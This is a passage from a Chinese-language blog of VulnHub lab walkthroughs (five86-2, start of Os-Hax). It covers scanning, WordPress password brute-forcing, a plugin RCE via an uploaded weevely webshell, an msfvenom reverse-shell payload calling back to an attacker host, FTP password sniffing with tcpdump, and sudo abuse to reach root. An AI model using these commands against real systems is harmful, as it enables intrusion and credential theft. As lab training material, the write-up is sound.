4.X (91%), Ubiquiti AirOS 5.X (90%), ZyXEL embedded (90%), Ubiquiti embedded (90%)</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6 cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;h:hp:p2000_g3 cpe:&#x2F;o:netgear:raidiator:4.2.24 cpe:&#x2F;o:ubnt:airos:5.2.6 cpe:&#x2F;o:linux:linux_kernel:2.6.32 cpe:&#x2F;h:ubnt:airmax_nanostation</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 - 3.13 (95%), Linux 2.6.22 - 2.6.36 (93%), Linux 2.6.32 - 2.6.39 (93%), Linux 2.6.37 (93%), Linux 3.10 - 4.11 (93%), Linux 2.6.39 (93%), Linux 2.6.32 (92%), Linux 3.2 - 4.9 (92%), Linux 2.6.32 - 3.10 (92%), HP P2000 G3 NAS device (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Uptime guess: 32.468 days (since Tue Feb 11 09:55:14 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Unix</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-10"><a class="markdownIt-Anchor" href="#web路径枚举-10"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.51/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.51&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.51&#x2F;index.php (CODE:301|SIZE:0)                                           </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.51&#x2F;server-status (CODE:403|SIZE:278)                                     </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-admin&#x2F;                                                </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-content&#x2F;                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.51&#x2F;wp-includes&#x2F;                                             </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.51&#x2F;xmlrpc.php (CODE:405|SIZE:42)</span><br></pre></td></tr></table></figure><ul><li>80端口上仅存在Wordpress服务框架</li></ul><h2 id="漏洞利用-10"><a class="markdownIt-Anchor" href="#漏洞利用-10"></a> 漏洞利用</h2><ul><li>未找到FTP服务版本相关漏洞</li><li>Wordpress深入信息收集</li><li>未挖掘出有漏洞的插件或主题</li><li>用户枚举</li></ul><p><code>wpscan --url http://192.168.31.51/ -e u</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] barney</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] gillian</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] peter</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line">[+] stephen</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>构造用户字典文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat user</span><br><span class="line"></span><br><span class="line">barney</span><br><span class="line">admin</span><br><span class="line">gillian</span><br><span class="line">peter</span><br><span class="line">stephen</span><br></pre></td></tr></table></figure><p>尝试进行账户爆破</p><p><code>wpscan --url http://192.168.31.51/ -U user -P /usr/share/wordlists/rockyou.txt</code></p><p>得到两个账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">barney spooky1</span><br><span class="line">stephen apollo1</span><br></pre></td></tr></table></figure><p>在<code>/wp-login.php</code>登入</p><p>登入之后在<code>Plugins</code>面板看到存在插件</p><p><code>Insert or Embed Articulate Content into WordPress Trial</code></p><p>搜索相关信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Insert or Embed Articulate Content into WordPress</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                             |  Path</span><br><span class="line">                                                                                           | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">WordPress Plugin Insert or Embed Articulate Content into WordPress - Remote Code Execution | exploits&#x2F;php&#x2F;webapps&#x2F;46981.txt</span><br><span class="line">------------------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure><p>再查看漏洞的具体利用步骤<br /><code>cat /usr/share/exploitdb/exploits/php/webapps/46981.txt</code></p><ol><li>使用weevely构造php后门并创建一个文件index.html，压缩成zip文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass &gt; shell.php</span><br><span class="line">echo &gt; index.html</span><br><span class="line">zip poc.zip index.html shell.php</span><br></pre></td></tr></table></figure><ol start="2"><li>登入wordpress(已登入)</li><li>依次点击<code>Posts -&gt; Add New -&gt; Add block -&gt; e-Learning -&gt; UPLOAD -&gt; CHOOES YOUR ZIP FILE -&gt; poc.zip -&gt; UPLOAD! -&gt; Insert As: iFrame -&gt; INSERT</code></li><li>此时会显示出index.html的路径，复制之后将index.html改为shell.php即为后门路径</li><li>连接后门<br /><code>weevely http://five86-2/wp-content/uploads/articulate_uploads/poc/shell.php pass</code></li></ol><h2 id="权限提升-10"><a class="markdownIt-Anchor" href="#权限提升-10"></a> 权限提升</h2><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux five86-2 5.3.0-26-generic #28-Ubuntu SMP Wed Dec 18 05:37:46 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>构造meterpreter后门程序</p><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9990 -f elf &gt; msf.elf</code></p><p>在MSF中开启监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp </span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9990</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在weevely中上传后门程序并启动(需要填写绝对路径)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_upload &#x2F;root&#x2F;software&#x2F;msf.elf &#x2F;var&#x2F;www&#x2F;html&#x2F;msf.elf</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">chmod +x msf.elf</span><br><span class="line">.&#x2F;msf.elf</span><br></pre></td></tr></table></figure><p>在meterpreter的shell中获取tty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看文件<code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:106:111::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:107:112::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:108:114::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:109:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:110:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">mysql:x:111:116:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">barney:x:1001:1001:Barney Sumner:&#x2F;home&#x2F;barney:&#x2F;bin&#x2F;bash</span><br><span class="line">stephen:x:1002:1002:Stephen Morris:&#x2F;home&#x2F;stephen:&#x2F;bin&#x2F;bash</span><br><span class="line">peter:x:1003:1003:Peter Hook:&#x2F;home&#x2F;peter:&#x2F;bin&#x2F;bash</span><br><span class="line">gillian:x:1004:1004:Gillian Gilbert:&#x2F;home&#x2F;gillian:&#x2F;bin&#x2F;bash</span><br><span class="line">richard:x:1005:1005:Richard Starkey:&#x2F;home&#x2F;richard:&#x2F;bin&#x2F;bash</span><br><span class="line">paul:x:1006:1006:Paul McCartney:&#x2F;home&#x2F;paul:&#x2F;bin&#x2F;bash</span><br><span class="line">john:x:1007:1007:John Lennon:&#x2F;home&#x2F;john:&#x2F;bin&#x2F;bash</span><br><span class="line">george:x:1008:1008:George Harrison:&#x2F;home&#x2F;george:&#x2F;bin&#x2F;bash</span><br><span class="line">dnsmasq:x:114:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure><p>存在用户<code>barney</code>和<code>stephen</code><br />尝试套用Wordpress账户的密码<br />可以登入账户stephen</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su stephen</span><br><span class="line">apollo1</span><br></pre></td></tr></table></figure><p>查看当前用户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">uid&#x3D;1002(stephen) gid&#x3D;1002(stephen) groups&#x3D;1002(stephen),1009(pcap)</span><br></pre></td></tr></table></figure><p>查看特权命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getcap -r &#x2F; 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;ping &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;mtr-packet &#x3D; cap_net_raw+ep</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;gstreamer1.0&#x2F;gstreamer-1.0&#x2F;gst-ptp-helper &#x3D; cap_net_bind_service,cap_net_admin+ep</span><br><span class="line">&#x2F;usr&#x2F;sbin&#x2F;tcpdump &#x3D; cap_net_admin,cap_net_raw+eip</span><br></pre></td></tr></table></figure><p>发现存在tcpdump程序，可以用于监听流量</p><p>查看程序tcpdump所有者与所有组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;usr&#x2F;sbin&#x2F;tcpdump</span><br><span class="line">-rwxr-x--- 1 root pcap 1044232 Oct 11 18:48 &#x2F;usr&#x2F;sbin&#x2F;tcpdump</span><br></pre></td></tr></table></figure><p>而用户stephen也属于pcap组，可以使用tcpdump程序</p><p>查看系统关于ftp的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep ftp</span><br><span class="line"></span><br><span class="line">systemd+  1251  0.0  0.3 119976  1876 pts&#x2F;0    Ss+  10:21   0:01 proftpd: (accepting connections)</span><br><span class="line">paul      2329  0.0  0.1   2600   788 ?        Ss   12:00   0:00 &#x2F;bin&#x2F;sh -c &#x2F;home&#x2F;paul&#x2F;ftp_upload.sh &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1</span><br><span class="line">paul      2330  0.0  0.1   2600   788 ?        S    12:00   0:00 &#x2F;bin&#x2F;sh &#x2F;home&#x2F;paul&#x2F;ftp_upload.sh</span><br><span class="line">paul      2331  0.0  0.4   3224  2124 ?        S    12:00   0:00 ftp -n 172.18.0.10</span><br><span class="line">1000      2332  0.0  1.2 133072  6124 pts&#x2F;0    S+   12:00   0:00 proftpd: paul - 172.18.0.1: STOR file.txt</span><br><span class="line">stephen   2335  0.0  0.1   6496   856 pts&#x2F;0    S+   12:01   0:00 grep ftp</span><br></pre></td></tr></table></figure><p>用户paul正在执行脚本<code>ftp_upload.sh</code>和命令<code>ftp -n 172.18.0.10</code><br />而FTP是明文传输，可以通过监听流量来获取一些信息</p><p>查看网络接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -D</span><br><span class="line"></span><br><span class="line">1.br-eca3858d86bf [Up, Running]</span><br><span class="line">2.eth0 [Up, Running]</span><br><span class="line">3.vethf7d5e2c [Up, Running]</span><br><span class="line">4.lo [Up, Running, Loopback]</span><br><span class="line">5.any (Pseudo-device that captures on all interfaces) [Up, Running]</span><br><span class="line">6.docker0 [Up]</span><br><span class="line">7.nflog (Linux netfilter log (NFLOG) interface) [none]</span><br><span class="line">8.nfqueue (Linux netfilter queue (NFQUEUE) interface) [none]</span><br></pre></td></tr></table></figure><p>监听流量一分钟</p><p><code>timeout 60 tcpdump -i vethf7d5e2c -w /tmp/cap.pcap</code></p><p>查看流量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -r &#x2F;tmp&#x2F;cap.pcap</span><br><span class="line"></span><br><span class="line">12:12:05.337100 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [P.], seq 1:58, ack 1, win 1019, options [nop,nop,TS val 1753001473 ecr 956298429], length 57: FTP: 220 ProFTPD 1.3.5e Server (Debian) [::ffff:172.18.0.10]</span><br><span class="line">12:12:05.337126 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [.], ack 58, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 0</span><br><span class="line">12:12:05.337305 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [P.], seq 1:12, ack 58, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 11: FTP: USER paul</span><br><span class="line">12:12:05.337311 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [.], ack 12, win 1019, options [nop,nop,TS val 1753001473 ecr 956302705], length 0</span><br><span class="line">12:12:05.337522 IP 172.18.0.10.ftp &gt; five86-2.42120: Flags [P.], seq 58:90, ack 12, win 1019, options [nop,nop,TS val 1753001473 ecr 956302705], length 32: FTP: 331 Password required for paul</span><br><span class="line">12:12:05.337610 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [.], ack 90, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 0</span><br><span class="line">12:12:05.337627 IP five86-2.42120 &gt; 172.18.0.10.ftp: Flags [P.], seq 12:33, ack 90, win 1004, options [nop,nop,TS val 956302705 ecr 1753001473], length 21: FTP: PASS esomepasswford</span><br></pre></td></tr></table></figure><p>得到账户<code>paul:esomepasswford</code></p><p>切换至账户paul</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su paul</span><br><span class="line">esomepasswford</span><br></pre></td></tr></table></figure><p>查看sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for paul on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User paul may run the following commands on five86-2:</span><br><span class="line">    (peter) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;service</span><br></pre></td></tr></table></figure><p>可以以用户peter的权限去执行<code>/usr/sbin/service</code><br />即可以通过该命令切换至账户peter<br /><code>sudo -u peter /usr/sbin/service ../../bin/bash</code></p><p>查看该用户sudo权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for peter on five86-2:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on five86-2:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;passwd</span><br></pre></td></tr></table></figure><p>即可用passwd命令修改root账户的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root passwd root</span><br><span class="line">hackforfun</span><br><span class="line">hackforfun</span><br></pre></td></tr></table></figure><p>切换至root账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>HTTP爆破</p></blockquote><p>我在自己尝试了弱口令字典失败后再想了一下别的方向，无果后去看其他大神的WP，发现需要用rockyou.txt，本地测试跑完这个字典需要数十个小时<br />这一步的话可能换一个简单点的口令或者放一个LFI漏洞去读passwd然后爆破hash就更恰当点</p><blockquote><p>FTP流量劫持</p></blockquote><p>做到流量劫持这一步整个人完全懵了，没想到是怎么看出来后台有FTP传输任务，顺着其他大神的思路打通之后浏览了下那个脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cat ftp_upload.sh</span><br><span class="line"></span><br><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">HOST&#x3D;&#39;172.18.0.10&#39;</span><br><span class="line">USER&#x3D;&#39;paul&#39;</span><br><span class="line">PASSWD&#x3D;&#39;esomepasswford&#39;</span><br><span class="line">FILE&#x3D;&#39;file.txt&#39;</span><br><span class="line"></span><br><span class="line">ftp -n $HOST &lt;&lt;END_SCRIPT</span><br><span class="line">quote USER $USER</span><br><span class="line">quote PASS $PASSWD</span><br><span class="line">binary</span><br><span class="line">put $FILE</span><br><span class="line">quit</span><br><span class="line">END_SCRIPT</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><p>大意应该是持续用ftp命令上传文件file.txt<br />所以在用命令<code>ps -aux | grep ftp</code>是会看到paul在执行<code>ftp -n 172.18.0.10</code></p><blockquote><p>为什么是网络接口vethf7d5e2c而不是br-eca3858d86bf</p></blockquote><p>本地操作时接口br-eca3858d86bf的ip是172.18.0.1，而vethf7d5e2c没有ipv4地址<br />实际操作时只能尝试监听所有可能的网卡</p><blockquote><p>capabilities 关于linux特权</p></blockquote><p>在系统的角度检测非root用户进行特权操作时，该命令所需的权限与被赋予的权限是否相符<br /><code>getcap -r / 2&gt;/dev/null</code></p><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/sparkdev/p/11417781.html">capabilities</a><br /><a href="http://man7.org/linux/man-pages/man7/capabilities.7.html">capabilities manual page</a><br /><a href="http://www.liuwx.cn/Vulnhub-five86-2.html#tcpdump%E6%8B%A6%E6%88%AA%E7%BD%91%E5%8D%A1%E6%B5%81%E9%87%8F%E8%8E%B7%E5%8F%96FTP%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81">WP</a></p></blockquote><hr /><h1 id="os-hax"><a class="markdownIt-Anchor" href="#os-hax"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-hax,389/">Os-Hax</a></h1><p><code>2020/03/17 20:53:03</code></p><h2 id="端口扫描-11"><a class="markdownIt-Anchor" href="#端口扫描-11"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.36</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.36</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 43:0e:61:74:5a:cc:e1:6b:72:39:b2:93:4e:e3:d0:81 (RSA)</span><br><span class="line">|   256 43:97:64:12:1d:eb:f1:e9:8c:d1:41:6d:ed:a4:5e:9c 